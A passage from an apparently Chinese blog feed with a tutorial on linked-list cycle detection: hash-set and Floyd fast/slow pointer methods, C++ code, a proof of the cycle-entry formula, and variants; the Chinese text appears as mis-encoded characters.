   c. <span class="hljs-keyword">current</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">current</span><span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>next
<span class="hljs-number">4.</span> è¿”å› <span class="hljs-literal">false</span>ï¼ˆæ— ç¯ï¼‰
</code></pre>
<h4 data-id="heading-7">2.1.3 å¤æ‚åº¦åˆ†æ</h4>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(n)ï¼Œæ¯ä¸ªèŠ‚ç‚¹æœ€å¤šè®¿é—®ä¸€æ¬¡</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(n)ï¼Œæœ€åæƒ…å†µéœ€è¦å­˜å‚¨æ‰€æœ‰èŠ‚ç‚¹</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šå®ç°ç®€å•ï¼Œé€»è¾‘æ¸…æ™°</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦é¢å¤–ç©ºé—´ï¼Œä¸é€‚åˆå†…å­˜å—é™åœºæ™¯</li>
</ul>
<h3 data-id="heading-8">2.2 å¿«æ…¢æŒ‡é’ˆæ³•ï¼ˆFloydåˆ¤åœˆç®—æ³•ï¼‰</h3>
<h4 data-id="heading-9">2.2.1 ç®—æ³•å‘æ˜èƒŒæ™¯</h4>
<p>ç”±è®¡ç®—æœºç§‘å­¦å®¶ Robert W. Floyd äº1967å¹´æå‡ºï¼Œæœ€åˆç”¨äºæ£€æµ‹æœ‰é™çŠ¶æ€æœºä¸­çš„å¾ªç¯ï¼Œåè¢«å¹¿æ³›åº”ç”¨äºé“¾è¡¨ç¯æ£€æµ‹ã€‚</p>
<h4 data-id="heading-10">2.2.2 æ ¸å¿ƒæ€æƒ³</h4>
<p>ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªå¿«æŒ‡é’ˆï¼ˆæ¯æ¬¡ç§»åŠ¨ä¸¤æ­¥ï¼‰ï¼Œä¸€ä¸ªæ…¢æŒ‡é’ˆï¼ˆæ¯æ¬¡ç§»åŠ¨ä¸€æ­¥ï¼‰ã€‚å¦‚æœé“¾è¡¨ä¸­å­˜åœ¨ç¯ï¼Œå¿«æŒ‡é’ˆæœ€ç»ˆä¼šè¿½ä¸Šæ…¢æŒ‡é’ˆï¼ˆç›¸é‡ï¼‰ï¼›å¦‚æœä¸å­˜åœ¨ç¯ï¼Œå¿«æŒ‡é’ˆä¼šå…ˆåˆ°è¾¾é“¾è¡¨æœ«å°¾ã€‚</p>
<h4 data-id="heading-11">2.2.3 ç®—æ³•æ­£ç¡®æ€§è¯æ˜</h4>
<p><strong>å®šç†</strong>ï¼šå¦‚æœé“¾è¡¨ä¸­å­˜åœ¨ç¯ï¼Œå¿«æ…¢æŒ‡é’ˆä¸€å®šä¼šç›¸é‡ã€‚</p>
<p><strong>è¯æ˜</strong>ï¼š
è®¾ï¼š</p>
<ul>
<li>ç¯å¤–éƒ¨åˆ†é•¿åº¦ä¸º Lï¼ˆä»å¤´èŠ‚ç‚¹åˆ°ç¯å…¥å£ï¼‰</li>
<li>ç¯é•¿åº¦ä¸º C</li>
<li>æ…¢æŒ‡é’ˆè¿›å…¥ç¯æ—¶ï¼Œå¿«æŒ‡é’ˆåœ¨ç¯ä¸­çš„ä½ç½®ä¸º kï¼ˆ0 â‰¤ k &lt; Cï¼‰</li>
</ul>
<p>åœ¨ç¯ä¸­ï¼Œå¿«æŒ‡é’ˆç›¸å¯¹äºæ…¢æŒ‡é’ˆçš„é€Ÿåº¦æ˜¯ 1 æ­¥/å•ä½æ—¶é—´ï¼ˆå¿«æŒ‡é’ˆé€Ÿåº¦2ï¼Œæ…¢æŒ‡é’ˆé€Ÿåº¦1ï¼Œç›¸å¯¹é€Ÿåº¦1ï¼‰ã€‚ç”±äºç¯æ˜¯å¾ªç¯çš„ï¼Œå¿«æŒ‡é’ˆæœ€å¤šéœ€è¦ C-1 æ—¶é—´å°±èƒ½è¿½ä¸Šæ…¢æŒ‡é’ˆã€‚</p>
<p>å› æ­¤ï¼Œæœ€åæƒ…å†µä¸‹ï¼Œä»æ…¢æŒ‡é’ˆè¿›å…¥ç¯å¼€å§‹è®¡ç®—ï¼Œç»è¿‡ C-1 æ¬¡ç§»åŠ¨ï¼Œå¿«æ…¢æŒ‡é’ˆå¿…ç„¶ç›¸é‡ã€‚</p>
<h2 data-id="heading-12">ä¸‰ã€ç®—æ³•è¯¦ç»†å®ç°</h2>
<h3 data-id="heading-13">3.1 åŸºç¡€ç»“æ„å®šä¹‰</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span> {
    <span class="hljs-type">int</span> val;
    ListNode* next;
    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) {}
    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x, ListNode* next) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(next) {}
};
</code></pre>
<h3 data-id="heading-14">3.2 å“ˆå¸Œè¡¨æ³•å®ç°</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycleHash</span><span class="hljs-params">(ListNode* head)</span> </span>{
        unordered_set&lt;ListNode*&gt; visited;
        
        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">nullptr</span>) {
            <span class="hljs-comment">// ä½¿ç”¨countæ–¹æ³•æ£€æŸ¥èŠ‚ç‚¹æ˜¯å¦å·²è®¿é—®</span>
            <span class="hljs-keyword">if</span> (visited.<span class="hljs-built_in">count</span>(head) &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å‘ç°ç¯</span>
            }
            visited.<span class="hljs-built_in">insert</span>(head);  <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹å·²è®¿é—®</span>
            head = head-&gt;next;     <span class="hljs-comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// éå†å®Œæˆï¼Œæ— ç¯</span>
    }
};
</code></pre>
<p><strong>å…³é”®ç‚¹è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>unordered_set::count(key)</code> è¿”å›å…ƒç´ åœ¨é›†åˆä¸­çš„å‡ºç°æ¬¡æ•°ï¼ˆ0æˆ–1ï¼‰</li>
<li><code>unordered_set::insert(key)</code> æ’å…¥å…ƒç´ ï¼Œå¦‚æœå·²å­˜åœ¨åˆ™ä¸é‡å¤æ’å…¥</li>
<li>å“ˆå¸Œè¡¨çš„å¹³å‡æŸ¥æ‰¾å’Œæ’å…¥æ—¶é—´å¤æ‚åº¦ä¸º O(1)</li>
</ul>
<h3 data-id="heading-15">3.3 å¿«æ…¢æŒ‡é’ˆæ³•å®ç°</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>{
        <span class="hljs-comment">// è¾¹ç•Œæƒ…å†µå¤„ç†</span>
        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        ListNode* slow = head;  <span class="hljs-comment">// æ…¢æŒ‡é’ˆï¼Œæ¯æ¬¡ç§»åŠ¨ä¸€æ­¥</span>
        ListNode* fast = head;  <span class="hljs-comment">// å¿«æŒ‡é’ˆï¼Œæ¯æ¬¡ç§»åŠ¨ä¸¤æ­¥</span>
        
        <span class="hljs-comment">// ç¬¬ä¸€é˜¶æ®µï¼šæ£€æµ‹ç¯æ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">nullptr</span>) {
            slow = slow-&gt;next;           <span class="hljs-comment">// æ…¢æŒ‡é’ˆç§»åŠ¨ä¸€æ­¥</span>
            fast = fast-&gt;next-&gt;next;     <span class="hljs-comment">// å¿«æŒ‡é’ˆç§»åŠ¨ä¸¤æ­¥</span>
            
            <span class="hljs-keyword">if</span> (slow == fast) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¿«æ…¢æŒ‡é’ˆç›¸é‡ï¼Œå­˜åœ¨ç¯</span>
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// å¿«æŒ‡é’ˆåˆ°è¾¾æœ«å°¾ï¼Œä¸å­˜åœ¨ç¯</span>
    }
};
</code></pre>
<h2 data-id="heading-16">å››ã€ç¯å…¥å£æ£€æµ‹ç®—æ³•</h2>
<h3 data-id="heading-17">4.1 æ•°å­¦åŸç†æ¨å¯¼</h3>
<p>è¿™æ˜¯å¿«æ…¢æŒ‡é’ˆæ³•æœ€ç²¾å¦™çš„éƒ¨åˆ†ã€‚å½“å¿«æ…¢æŒ‡é’ˆç›¸é‡åï¼Œå¦‚ä½•æ‰¾åˆ°ç¯çš„å…¥å£ï¼Ÿ</p>
<p><strong>è®¾</strong>ï¼š</p>
<ul>
<li>L1ï¼šé“¾è¡¨å¤´åˆ°ç¯å…¥å£çš„è·ç¦»</li>
<li>L2ï¼šç¯å…¥å£åˆ°å¿«æ…¢æŒ‡é’ˆç›¸é‡ç‚¹çš„è·ç¦»</li>
<li>Cï¼šç¯çš„é•¿åº¦</li>
<li>nï¼šå¿«æŒ‡é’ˆåœ¨ç›¸é‡å‰ç»•ç¯çš„åœˆæ•°ï¼ˆn â‰¥ 1ï¼‰</li>
</ul>
<p><strong>å·²çŸ¥æ¡ä»¶</strong>ï¼š</p>
<ol>
<li>å¿«æŒ‡é’ˆé€Ÿåº¦æ˜¯æ…¢æŒ‡é’ˆçš„2å€</li>
<li>ç›¸é‡æ—¶ï¼Œæ…¢æŒ‡é’ˆèµ°äº†ï¼šL1 + L2</li>
<li>å¿«æŒ‡é’ˆèµ°äº†ï¼šL1 + L2 + nC</li>
</ol>
<p><strong>å»ºç«‹æ–¹ç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">2(L1 + L2) = L1 + L2 + <span class="hljs-attr">nC</span>
=&gt; L1 + <span class="hljs-attr">L2</span> = nC
=&gt; <span class="hljs-attr">L1</span> = nC - L2
</code></pre>
<p><strong>å…³é”®å‘ç°</strong>ï¼š</p>
<ul>
<li><code>L1 = (n-1)C + (C - L2)</code></li>
<li><code>C - L2</code> æ˜¯ä»ç›¸é‡ç‚¹ç»§ç»­èµ°åˆ°ç¯å…¥å£çš„è·ç¦»</li>
<li>å› æ­¤ï¼Œä»é“¾è¡¨å¤´èµ° L1 æ­¥ = ä»ç›¸é‡ç‚¹èµ° (n-1)C + (C-L2) æ­¥</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šä¸€ä¸ªæŒ‡é’ˆä»é“¾è¡¨å¤´å¼€å§‹ï¼Œå¦ä¸€ä¸ªä»ç›¸é‡ç‚¹å¼€å§‹ï¼Œä»¥ç›¸åŒé€Ÿåº¦å‰è¿›ï¼Œå®ƒä»¬å°†åœ¨ç¯å…¥å£ç›¸é‡ã€‚</p>
<h3 data-id="heading-18">4.2 ç¯å…¥å£æ£€æµ‹å®ç°</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">ListNode* <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode* head)</span> </span>{
        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
        }
        
        ListNode* slow = head;
        ListNode* fast = head;
        
        <span class="hljs-comment">// ç¬¬ä¸€é˜¶æ®µï¼šæ£€æµ‹ç¯</span>
        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">nullptr</span>) {
            slow = slow-&gt;next;
            fast = fast-&gt;next-&gt;next;
            
            <span class="hljs-keyword">if</span> (slow == fast) {
                <span class="hljs-comment">// ç¬¬äºŒé˜¶æ®µï¼šæ‰¾åˆ°ç¯å…¥å£</span>
                ListNode* entry = head;  <span class="hljs-comment">// æ–°æŒ‡é’ˆä»é“¾è¡¨å¤´å¼€å§‹</span>
                
                <span class="hljs-keyword">while</span> (entry != slow) {  <span class="hljs-comment">// ä¸¤ä¸ªæŒ‡é’ˆåŒæ­¥å‰è¿›</span>
                    entry = entry-&gt;next;
                    slow = slow-&gt;next;
                }
                
                <span class="hljs-keyword">return</span> entry;  <span class="hljs-comment">// ç›¸é‡ç‚¹å³ä¸ºç¯å…¥å£</span>
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// æ— ç¯</span>
    }
};
</code></pre>
<h2 data-id="heading-19">äº”ã€ç®—æ³•å¤æ‚åº¦å¯¹æ¯”</h2>


























<table><thead><tr><th>ç®—æ³•</th><th>æ—¶é—´å¤æ‚åº¦</th><th>ç©ºé—´å¤æ‚åº¦</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>å“ˆå¸Œè¡¨æ³•</td><td>O(n)</td><td>O(n)</td><td>å®ç°ç®€å•ï¼Œé€»è¾‘æ¸…æ™°</td><td>éœ€è¦é¢å¤–ç©ºé—´</td></tr><tr><td>å¿«æ…¢æŒ‡é’ˆæ³•</td><td>O(n)</td><td>O(1)</td><td>ç©ºé—´æœ€ä¼˜ï¼Œé€‚åˆå†…å­˜å—é™åœºæ™¯</td><td>å®ç°ç¨å¤æ‚ï¼Œéœ€è¦æ•°å­¦ç†è§£</td></tr></tbody></table>
<p><strong>æ—¶é—´å¤æ‚åº¦åˆ†æ</strong>ï¼š</p>
<ul>
<li>å“ˆå¸Œè¡¨æ³•ï¼šæ¯ä¸ªèŠ‚ç‚¹è®¿é—®ä¸€æ¬¡ï¼Œå“ˆå¸Œæ“ä½œO(1)ï¼Œæ€»O(n)</li>
<li>å¿«æ…¢æŒ‡é’ˆæ³•ï¼šå¿«æŒ‡é’ˆæœ€å¤šéå†é“¾è¡¨ä¸¤æ¬¡ï¼Œæ€»O(n)</li>
</ul>
<p><strong>ç©ºé—´å¤æ‚åº¦åˆ†æ</strong>ï¼š</p>
<ul>
<li>å“ˆå¸Œè¡¨æ³•ï¼šæœ€åå­˜å‚¨æ‰€æœ‰èŠ‚ç‚¹ï¼ŒO(n)</li>
<li>å¿«æ…¢æŒ‡é’ˆæ³•ï¼šåªä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼ŒO(1)</li>
</ul>
<h2 data-id="heading-20">å…­ã€è¾¹ç•Œæƒ…å†µä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-21">6.1 è¾¹ç•Œæƒ…å†µå¤„ç†</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è¾¹ç•Œæƒ…å†µæµ‹è¯•</span>
vector&lt;ListNode*&gt; test_cases = {
    <span class="hljs-literal">nullptr</span>,                    <span class="hljs-comment">// ç©ºé“¾è¡¨</span>
    <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>),           <span class="hljs-comment">// å•èŠ‚ç‚¹æ— ç¯</span>
    <span class="hljs-built_in">makeSelfCycle</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>)), <span class="hljs-comment">// å•èŠ‚ç‚¹è‡ªç¯</span>
    <span class="hljs-built_in">makeCycle</span>({<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>}, <span class="hljs-number">0</span>),     <span class="hljs-comment">// ç¯åœ¨å¤´èŠ‚ç‚¹</span>
    <span class="hljs-built_in">makeCycle</span>({<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>}, <span class="hljs-number">2</span>), <span class="hljs-comment">// ç¯åœ¨ä¸­é—´</span>
    <span class="hljs-built_in">makeCycle</span>({<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>}, <span class="hljs-number">4</span>)  <span class="hljs-comment">// ç¯åœ¨å°¾èŠ‚ç‚¹</span>
};
</code></pre>
<h3 data-id="heading-22">6.2 å†…å­˜ç®¡ç†æ³¨æ„äº‹é¡¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åˆ›å»ºæµ‹è¯•é“¾è¡¨æ—¶éœ€è¦ç®¡ç†å†…å­˜</span>
<span class="hljs-function">ListNode* <span class="hljs-title">createTestListWithCycle</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; values, <span class="hljs-type">int</span> cyclePos)</span> </span>{
    <span class="hljs-keyword">if</span> (values.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    vector&lt;ListNode*&gt; nodes;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> val : values) {
        nodes.<span class="hljs-built_in">push_back</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(val));
    }
    
    <span class="hljs-comment">// è¿æ¥èŠ‚ç‚¹</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; nodes.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) {
        nodes[i]-&gt;next = nodes[i + <span class="hljs-number">1</span>];
    }
    
    <span class="hljs-comment">// åˆ›å»ºç¯</span>
    <span class="hljs-keyword">if</span> (cyclePos &gt;= <span class="hljs-number">0</span> &amp;&amp; cyclePos &lt; values.<span class="hljs-built_in">size</span>()) {
        nodes.<span class="hljs-built_in">back</span>()-&gt;next = nodes[cyclePos];
    }
    
    <span class="hljs-keyword">return</span> nodes[<span class="hljs-number">0</span>];
}

<span class="hljs-comment">// æµ‹è¯•å®Œæˆåé‡Šæ”¾å†…å­˜</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteList</span><span class="hljs-params">(ListNode* head, unordered_set&lt;ListNode*&gt;&amp; visited)</span> </span>{
    <span class="hljs-comment">// æœ‰ç¯é“¾è¡¨éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œé¿å…æ— é™å¾ªç¯</span>
}
</code></pre>
<h2 data-id="heading-23">ä¸ƒã€å®é™…åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-24">7.1 å†…å­˜æ³„æ¼æ£€æµ‹</h3>
<p>åœ¨åƒåœ¾å›æ”¶å’Œå†…å­˜ç®¡ç†ç³»ç»Ÿä¸­ï¼Œæ£€æµ‹å¾ªç¯å¼•ç”¨å¯ä»¥é¿å…å†…å­˜æ³„æ¼ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryManager</span> {
<span class="hljs-keyword">private</span>:
    unordered_set&lt;Object*&gt; visited;
    
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycleReference</span><span class="hljs-params">(Object* obj)</span> </span>{
        <span class="hljs-comment">// ä½¿ç”¨ç±»ä¼¼é“¾è¡¨åˆ¤ç¯çš„ç®—æ³•æ£€æµ‹å¯¹è±¡å¼•ç”¨ç¯</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">detectCycleInReferences</span>(obj);
    }
};
</code></pre>
<h3 data-id="heading-25">7.2 å¹¶å‘æ­»é”æ£€æµ‹</h3>
<p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œæ£€æµ‹èµ„æºåˆ†é…å›¾ä¸­çš„ç¯å¯ä»¥é¢„é˜²æ­»é”ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockDetector</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">detectDeadlock</span><span class="hljs-params">(vector&lt;Process&gt;&amp; processes)</span> </span>{
        <span class="hljs-comment">// å°†è¿›ç¨‹ç­‰å¾…å…³ç³»å»ºæ¨¡ä¸ºå›¾ï¼Œæ£€æµ‹ç¯</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hasCycleInWaitForGraph</span>(processes);
    }
};
</code></pre>
<h3 data-id="heading-26">7.3 ç¼–è¯‘å™¨ä¼˜åŒ–</h3>
<p>åœ¨ç¼–è¯‘å™¨çš„æ•°æ®æµåˆ†æå’Œæ§åˆ¶æµåˆ†æä¸­ï¼Œæ£€æµ‹å¾ªç¯ç»“æ„ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CompilerOptimizer</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">analyzeControlFlow</span><span class="hljs-params">(CFG* cfg)</span> </span>{
        <span class="hljs-comment">// æ£€æµ‹æ§åˆ¶æµå›¾ä¸­çš„ç¯ï¼ˆå¾ªç¯ç»“æ„ï¼‰</span>
        <span class="hljs-built_in">detectLoopsInCFG</span>(cfg);
    }
};
</code></pre>
<h2 data-id="heading-27">å…«ã€æ‰©å±•ä¸å˜ä½“</h2>
<h3 data-id="heading-28">8.1 æ±‚ç¯çš„é•¿åº¦</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cycleLength</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">hasCycle</span>(head)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    
    ListNode* slow = head;
    ListNode* fast = head;
    
    <span class="hljs-comment">// ç¬¬ä¸€é˜¶æ®µï¼šæ‰¾åˆ°ç›¸é‡ç‚¹</span>
    <span class="hljs-keyword">while</span> (fast &amp;&amp; fast-&gt;next) {
        slow = slow-&gt;next;
        fast = fast-&gt;next-&gt;next;
        <span class="hljs-keyword">if</span> (slow == fast) <span class="hljs-keyword">break</span>;
    }
    
    <span class="hljs-comment">// ç¬¬äºŒé˜¶æ®µï¼šè®¡ç®—ç¯é•¿</span>
    <span class="hljs-type">int</span> length = <span class="hljs-number">1</span>;
    fast = fast-&gt;next;
    <span class="hljs-keyword">while</span> (fast != slow) {
        fast = fast-&gt;next;
        length++;
    }
    
    <span class="hljs-keyword">return</span> length;
}
</code></pre>
<h3 data-id="heading-29">8.2 åˆ¤æ–­ç¯çš„ä½ç½®ç±»å‹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">CycleType</span> {
    NO_CYCLE,
    SELF_CYCLE,      <span class="hljs-comment">// è‡ªç¯</span>
    SMALL_CYCLE,     <span class="hljs-comment">// å°ç¯ï¼ˆé•¿åº¦â‰¤3ï¼‰</span>
    LARGE_CYCLE      <span class="hljs-comment">// å¤§ç¯</span>
};

<span class="hljs-function">CycleType <span class="hljs-title">classifyCycle</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">hasCycle</span>(head)) <span class="hljs-keyword">return</span> NO_CYCLE;
    
    ListNode* entry = <span class="hljs-built_in">detectCycle</span>(head);
    
    <span class="hljs-keyword">if</span> (entry == entry-&gt;next) <span class="hljs-keyword">return</span> SELF_CYCLE;
    
    <span class="hljs-type">int</span> len = <span class="hljs-built_in">cycleLength</span>(head);
    <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">3</span>) <span class="hljs-keyword">return</span> SMALL_CYCLE;
    
    <span class="hljs-keyword">return</span> LARGE_CYCLE;
}
</code></pre>
<h2 data-id="heading-30">ä¹ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-31">9.1 ç®—æ³•é€‰æ‹©å»ºè®®</h3>
<ol>
<li><strong>é¢è¯•åœºæ™¯</strong>ï¼šä¼˜å…ˆå®ç°å¿«æ…¢æŒ‡é’ˆæ³•ï¼Œå±•ç°ç®—æ³•ç†è§£æ·±åº¦</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒ</strong>ï¼šæ ¹æ®å†…å­˜çº¦æŸé€‰æ‹©ï¼Œå†…å­˜å……è¶³å¯ç”¨å“ˆå¸Œè¡¨æ³•ï¼ˆæ›´ç¨³å®šï¼‰</li>
<li><strong>ç«èµ›åœºæ™¯</strong>ï¼šå¿«æ…¢æŒ‡é’ˆæ³•ï¼ˆç©ºé—´æ•ˆç‡é«˜ï¼‰</li>
</ol>
<h3 data-id="heading-32">9.2 ç¼–ç æ³¨æ„äº‹é¡¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è‰¯å¥½çš„ç¼–ç ä¹ æƒ¯</span>
<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycleBestPractice</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-comment">// 1. ä¼˜å…ˆå¤„ç†è¾¹ç•Œæƒ…å†µ</span>
    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// 2. å˜é‡å‘½åæ¸…æ™°</span>
    ListNode* slowPointer = head;
    ListNode* fastPointer = head;
    
    <span class="hljs-comment">// 3. å¾ªç¯æ¡ä»¶ä¸¥è°¨</span>
    <span class="hljs-keyword">while</span> (fastPointer != <span class="hljs-literal">nullptr</span> &amp;&amp; fastPointer-&gt;next != <span class="hljs-literal">nullptr</span>) {
        <span class="hljs-comment">// 4. ç§»åŠ¨æŒ‡é’ˆåå†æ¯”è¾ƒ</span>
        slowPointer = slowPointer-&gt;next;
        fastPointer = fastPointer-&gt;next-&gt;next;
        
        <span class="hljs-comment">// 5. ä½¿ç”¨æ˜ç¡®çš„æ¯”è¾ƒ</span>
        <span class="hljs-keyword">if</span> (slowPointer == fastPointer) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    
    <span class="hljs-comment">// 6. æ˜ç¡®è¿”å›æ— ç¯</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h3 data-id="heading-33">9.3 å­¦ä¹ è¦ç‚¹</h3>
<ol>
<li><strong>ç†è§£æ•°å­¦åŸç†</strong>ï¼šå¿«æ…¢æŒ‡é’ˆæ³•çš„æ ¸å¿ƒæ˜¯æ•°å­¦æ¨å¯¼</li>
<li><strong>æŒæ¡è¾¹ç•Œå¤„ç†</strong>ï¼šç©ºé“¾è¡¨ã€å•èŠ‚ç‚¹ã€è‡ªç¯ç­‰ç‰¹æ®Šæƒ…å†µ</li>
<li><strong>åˆ†æå¤æ‚åº¦</strong>ï¼šç†è§£æ—¶é—´-ç©ºé—´æƒè¡¡</li>
<li><strong>è”ç³»å®é™…åº”ç”¨</strong>ï¼šäº†è§£ç®—æ³•åœ¨çœŸå®ç³»ç»Ÿä¸­çš„ç”¨é€”</li>
</ol>
<p>é“¾è¡¨ç¯æ£€æµ‹ç®—æ³•ä¸ä»…æ˜¯é¢è¯•é«˜é¢‘é¢˜ï¼Œæ›´æ˜¯ç†è§£æŒ‡é’ˆæ“ä½œã€ç®—æ³•è®¾è®¡å’Œæ•°å­¦æ€ç»´çš„ç»ä½³æ¡ˆä¾‹ã€‚é€šè¿‡æ·±å…¥ç†è§£è¿™ä¸ªé—®é¢˜çš„å¤šç§è§£æ³•ï¼Œå¯ä»¥æå‡è§£å†³å¤æ‚é—®é¢˜çš„èƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»è¯¯åˆ¤åˆ°ç²¾å‡†ï¼šæ¸¸æˆç¤¾åŒº AI å®¡æ ¸çš„å·¥ç¨‹åŒ–å®è·µ]]></title>    <link>https://juejin.cn/post/7580606750291951667</link>    <guid>https://juejin.cn/post/7580606750291951667</guid>    <pubDate>2025-12-08T01:58:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580606750291951667" data-draft-id="7580570363602206772" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 